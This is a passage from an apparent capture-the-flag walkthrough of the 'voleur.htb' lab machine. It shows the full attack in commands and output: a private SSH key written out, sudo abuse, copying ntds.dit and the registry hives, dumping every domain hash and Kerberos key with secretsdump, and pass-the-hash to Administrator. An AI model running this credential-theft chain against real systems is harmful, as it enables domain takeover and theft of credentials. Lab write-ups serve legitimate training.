lOwP+sY7+rXOTA2nJ3qE0J8gGEiS8DFzPOF80OLrAAAFiIygOJSMoDiUAAAAB3NzaC1yc2
EAAAGBAKhcjzL1EVv6m8kZXpgDM2j1b30eyTR85y+sQxz+KP4aliM593Weuj9mm7DIGctl
1xn9qTtDNd1InYgWhd3SzS+2NUnkvwzIrBONdcx8egEDHqY9DBgYv3NVH4u61TKvl+jSZ2
9r+aQs6aMqGzjVqKwVzClfQ520LplsWFykMq+r4Eqy3dyQVukzWWtz1k4cvcK00TnoHWGq
go85Nz7HHLeuj4ZkD8lpHlWyBmQKhAv3nXzjc5mYzG5+3bicCC+XOvDDLgovbvdTAORQIo
JzbYL72FYav6S5IXCpIdXokdNU8lJnh1SYQUC8Fc3BzXVZPhjvjc4ckTqrsYWmlY3DvC9y
jD2DVGZf3OKL/NCBtOIQLwECBsjbwD7hFxpyxIikXDYPpryOv7CyHFOaEJDyTO1xZXo0ih
34CXD9VtzDAwGCqZALmUycEj/SElVZY+Ef5X1tfLSool7soDhrnZtwG2OuQpTsD/rGO/q1
zkwNpyd6hNCfIBhIkvAxczzhfNDi6wAAAAMBAAEAAAGBAIrVgPSZaI47s5l6hSm/gfZsZl
p8N5lD4nTKjbFr2SvpiqNT2r8wfA9qMrrt12+F9IInThVjkBiBF/6v7AYHHlLY40qjCfSl
ylh5T4mnoAgTpYOaVc3NIpsdt9zG3aZlbFR+pPMZzAvZSXTWdQpCDkyR0QDQ4PY8Li0wTh
FfCbkZd+TBaPjIQhMd2AAmzrMtOkJET0B8KzZtoCoxGWB4WzMRDKPbAbWqLGyoWGLI1Sj1
MPZareocOYBot7fTW2C7SHXtPFP9+kagVskAvaiy5Rmv2qRfu9Lcj2TfCVXdXbYyxTwoJF
ioxGl+PfiieZ6F8v4ftWDwfC+Pw2sD8ICK/yrnreGFNxdPymck+S8wPmxjWC/p0GEhilK7
wkr17GgC30VyLnOuzbpq1tDKrCf8VA4aZYBIh3wPfWFEqhlCvmr4sAZI7B+7eBA9jTLyxq
3IQpexpU8BSz8CAzyvhpxkyPXsnJtUQ8OWph1ltb9aJCaxWmc1r3h6B4VMjGILMdI/KQAA
AMASKeZiz81mJvrf2C5QgURU4KklHfgkSI4p8NTyj0WGAOEqPeAbdvj8wjksfrMC004Mfa
b/J+gba1MVc7v8RBtKHWjcFe1qSNSW2XqkQwxKb50QD17TlZUaOJF2ZSJi/xwDzX+VX9r+
vfaTqmk6rQJl+c3sh+nITKBN0u7Fr/ur0/FQYQASJaCGQZvdbw8Fup4BGPtxqFKETDKC09
41/zTd5viNX38LVig6SXhTYDDL3eyT5DE6SwSKleTPF+GsJLgAAADBANMs31CMRrE1ECBZ
sP+4rqgJ/GQn4ID8XIOG2zti2pVJ0dx7I9nzp7NFSrE80Rv8vH8Ox36th/X0jme1AC7jtR
B+3NLjpnGA5AqcPklI/lp6kSzEigvBl4nOz07fj3KchOGCRP3kpC5fHqXe24m3k2k9Sr+E
a29s98/18SfcbIOHWS4AUpHCNiNskDHXewjRJxEoE/CjuNnrVIjzWDTwTbzqQV+FOKOXoV
B9NzMi0MiCLy/HJ4dwwtce3sssxUk7pQAAAMEAzBk3mSKy7UWuhHExrsL/jzqxd7bVmLXU
EEju52GNEQL1TW4UZXVtwhHYrb0Vnu0AE+r/16o0gKScaa+lrEeQqzIARVflt7ZpJdpl3Z
fosiR4pvDHtzbqPVbixqSP14oKRSeswpN1Q50OnD11tpIbesjH4ZVEXv7VY9/Z8VcooQLW
GSgUcaD+U9Ik13vlNrrZYs9uJz3aphY6Jo23+7nge3Ui7ADEvnD3PAtzclU3xMFyX9Gf+9
RveMEYlXZqvJ9PAAAADXN2Y19iYWNrdXBAREMBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
*Evil-WinRM* PS C:\IT\Third-Line Support> cat Note.txt.txt
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
*Evil-WinRM* PS C:\IT\Third-Line Support> ls Backups
Access to the path 'C:\IT\Third-Line Support\Backups' is denied.
At line:1 char:1
+ ls Backups
+ ~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\IT\Third-Line Support\Backups:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

Now grab that file and ssh at port `2222` to user `svc_backup`:
```bash
$ cat << EOF > id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAqFyPMvURW/qbyRlemAMzaPVvfR7JNHznL6xDHP4o/hqWIzn3dZ66
P2absMgZy2XXGf2pO0M13UidiBaF3dLNL7Y1SeS/DMisE411zHx6AQMepj0MGBi/c1Ufi7
rVMq+X6NJnb2v5pCzpoyobONWorBXMKV9DnbQumWxYXKQyr6vgSrLd3JBW6TNZa3PWThy9
wrTROegdYaqCjzk3Pscct66PhmQPyWkeVbIGZAqEC/edfONzmZjMbn7duJwIL5c68MMuCi
9u91MA5FAignNtgvvYVhq/pLkhcKkh1eiR01TyUmeHVJhBQLwVzcHNdVk+GO+NzhyROqux
haaVjcO8L3KMPYNUZl/c4ov80IG04hAvAQIGyNvAPuEXGnLEiKRcNg+mvI6/sLIcU5oQkP
JM7XFlejSKHfgJcP1W3MMDAYKpkAuZTJwSP9ISVVlj4R/lfW18tKiiXuygOGudm3AbY65C
lOwP+sY7+rXOTA2nJ3qE0J8gGEiS8DFzPOF80OLrAAAFiIygOJSMoDiUAAAAB3NzaC1yc2
EAAAGBAKhcjzL1EVv6m8kZXpgDM2j1b30eyTR85y+sQxz+KP4aliM593Weuj9mm7DIGctl
1xn9qTtDNd1InYgWhd3SzS+2NUnkvwzIrBONdcx8egEDHqY9DBgYv3NVH4u61TKvl+jSZ2
9r+aQs6aMqGzjVqKwVzClfQ520LplsWFykMq+r4Eqy3dyQVukzWWtz1k4cvcK00TnoHWGq
go85Nz7HHLeuj4ZkD8lpHlWyBmQKhAv3nXzjc5mYzG5+3bicCC+XOvDDLgovbvdTAORQIo
JzbYL72FYav6S5IXCpIdXokdNU8lJnh1SYQUC8Fc3BzXVZPhjvjc4ckTqrsYWmlY3DvC9y
jD2DVGZf3OKL/NCBtOIQLwECBsjbwD7hFxpyxIikXDYPpryOv7CyHFOaEJDyTO1xZXo0ih
34CXD9VtzDAwGCqZALmUycEj/SElVZY+Ef5X1tfLSool7soDhrnZtwG2OuQpTsD/rGO/q1
zkwNpyd6hNCfIBhIkvAxczzhfNDi6wAAAAMBAAEAAAGBAIrVgPSZaI47s5l6hSm/gfZsZl
p8N5lD4nTKjbFr2SvpiqNT2r8wfA9qMrrt12+F9IInThVjkBiBF/6v7AYHHlLY40qjCfSl
ylh5T4mnoAgTpYOaVc3NIpsdt9zG3aZlbFR+pPMZzAvZSXTWdQpCDkyR0QDQ4PY8Li0wTh
FfCbkZd+TBaPjIQhMd2AAmzrMtOkJET0B8KzZtoCoxGWB4WzMRDKPbAbWqLGyoWGLI1Sj1
MPZareocOYBot7fTW2C7SHXtPFP9+kagVskAvaiy5Rmv2qRfu9Lcj2TfCVXdXbYyxTwoJF
ioxGl+PfiieZ6F8v4ftWDwfC+Pw2sD8ICK/yrnreGFNxdPymck+S8wPmxjWC/p0GEhilK7
wkr17GgC30VyLnOuzbpq1tDKrCf8VA4aZYBIh3wPfWFEqhlCvmr4sAZI7B+7eBA9jTLyxq
3IQpexpU8BSz8CAzyvhpxkyPXsnJtUQ8OWph1ltb9aJCaxWmc1r3h6B4VMjGILMdI/KQAA
AMASKeZiz81mJvrf2C5QgURU4KklHfgkSI4p8NTyj0WGAOEqPeAbdvj8wjksfrMC004Mfa
b/J+gba1MVc7v8RBtKHWjcFe1qSNSW2XqkQwxKb50QD17TlZUaOJF2ZSJi/xwDzX+VX9r+
vfaTqmk6rQJl+c3sh+nITKBN0u7Fr/ur0/FQYQASJaCGQZvdbw8Fup4BGPtxqFKETDKC09
41/zTd5viNX38LVig6SXhTYDDL3eyT5DE6SwSKleTPF+GsJLgAAADBANMs31CMRrE1ECBZ
sP+4rqgJ/GQn4ID8XIOG2zti2pVJ0dx7I9nzp7NFSrE80Rv8vH8Ox36th/X0jme1AC7jtR
B+3NLjpnGA5AqcPklI/lp6kSzEigvBl4nOz07fj3KchOGCRP3kpC5fHqXe24m3k2k9Sr+E
a29s98/18SfcbIOHWS4AUpHCNiNskDHXewjRJxEoE/CjuNnrVIjzWDTwTbzqQV+FOKOXoV
B9NzMi0MiCLy/HJ4dwwtce3sssxUk7pQAAAMEAzBk3mSKy7UWuhHExrsL/jzqxd7bVmLXU
EEju52GNEQL1TW4UZXVtwhHYrb0Vnu0AE+r/16o0gKScaa+lrEeQqzIARVflt7ZpJdpl3Z
fosiR4pvDHtzbqPVbixqSP14oKRSeswpN1Q50OnD11tpIbesjH4ZVEXv7VY9/Z8VcooQLW
GSgUcaD+U9Ik13vlNrrZYs9uJz3aphY6Jo23+7nge3Ui7ADEvnD3PAtzclU3xMFyX9Gf+9
RveMEYlXZqvJ9PAAAADXN2Y19iYWNrdXBAREMBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
EOF

$ chmod 600 ./id_rsa
$ ssh -i ./id_rsa svc_backup@voleur.htb -p 2222

<SNIP>

svc_backup@DC:~$
```

Let's see what that user can do:
```bash
svc_backup@DC:~$ sudo -l
Matching Defaults entries for svc_backup on DC:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_backup may run the following commands on DC:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

That's a backup user so it should be able to read *any* file on the DC. *Any* file includes `ntds.dit` file, `SECURITY` and `SYSTEM` registry hives:
```bash
svc_backup@DC:~$ cd /mnt/c/IT/Third-Line\ Support/Backups/
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls
'Active Directory'   registry
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ cd registry
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls
SECURITY  SYSTEM
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls -la
total 17952
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 .
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 ..
-rwxrwxrwx 1 svc_backup svc_backup    32768 Jan 30  2025 SECURITY
-rwxrwxrwx 1 svc_backup svc_backup 18350080 Jan 30  2025 SYSTEM
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ cd ../Active\ Directory/
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls
ntds.dit  ntds.jfm
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls -la
total 24592
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 .
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 ..
-rwxrwxrwx 1 svc_backup svc_backup 25165824 Jan 30  2025 ntds.dit
-rwxrwxrwx 1 svc_backup svc_backup    16384 Jan 30  2025 ntds.jfm
```

As you can see we indeed have access to those files. Let's download them using `scp` for offline credential extraction:
```bash
$ scp -i ./id_rsa -P 2222 "svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY" ./SECURITY
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
SECURITY

$ scp -i ./id_rsa -P 2222 "svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" ./SYSTEM                                                                                                                                       
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
SYSTEM

$ scp -i ./id_rsa -P 2222 "svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" ./ntds.dit                                                                                                                           
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
ntds.dit
```

Now we can use `impacket-secretsdump` to dump all credentials:
```bash
$ impacket-secretsdump -ntds ./ntds.dit -system ./SYSTEM -security ./SECURITY LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
[*] DPAPI_SYSTEM
dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
[*] NL$KM
 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ./ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ./ntds.dit
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up...
```

`Administrator`:`e656e07c56d831611b577b160b259ad2`

Let's get a TGT and login:
```bash
$ impacket-getTGT -hashes :e656e07c56d831611b577b160b259ad2 voleur.htb/Administrator -dc-ip $IP
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in Administrator.ccache

$ export KRB5CCNAME=Administrator.ccache

$ evil-winrm -i dc.voleur.htb -r voleur.htb

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
[REDACTED]
```

![voleur-6.htb](/assets/img/ctf/data/voleur-6.png)

---

## 🧠 Retrospective

* **Learnings:**
  1. **The "Google Maps" of Kerberos (KRB5_CONFIG):** In environments where NTLM is disabled, your Kali machine is "blind" to the domain logic. Exporting `KRB5_CONFIG` to point to a local `.krb5` file is the mechanical equivalent of giving your tools a map. Without it, tools like `evil-winrm` or `impacket` cannot resolve the Realm to the KDC, even if the IP is in `/etc/hosts`.
  2. **Targeted vs. Traditional Kerberoasting:** Never rely solely on `impacket-GetUserSPNs`. While it only finds accounts with existing SPNs, scripts like `targetedKerberoast.py` look for Object Control (ACLs). If you have `GenericWrite` or `WriteSPN` over a user (like `svc_ldap` had over `svc_winrm`), you can force a roastable state that traditional scanners will miss.
  3. **FQDN Rigidity:** Kerberos is strictly tied to hostnames. Using an IP address for authentication (`-i 10.129.x.x`) will almost always fail because the resulting SPN (e.g., `WSMAN/10.129.x.x`) doesn't exist in the AD database. You must always use the FQDN (`dc.voleur.htb`) to ensure the ticket request matches a valid service principal.
  4. **Case Sensitivity in Realms:** AD Realms are case-sensitive in many Kerberos implementations. If your config defines `VOLEUR.HTB`, passing `-r voleur.htb` can lead to "KDC not found" errors because the library treats them as entirely different logical entities.
  5. **The Value of "Leavers":** Crossed-out users in documentation aren't just fluff. They represent the AD Recycle Bin path. Identifying users who were recently "deleted" but had their passwords reset to a known value is a high-reward pivot point if you have the rights to restore objects.
  6. **SMB Shares:** Never forget to recheck shares with newly found credentials because different users have access to different files, obviously.
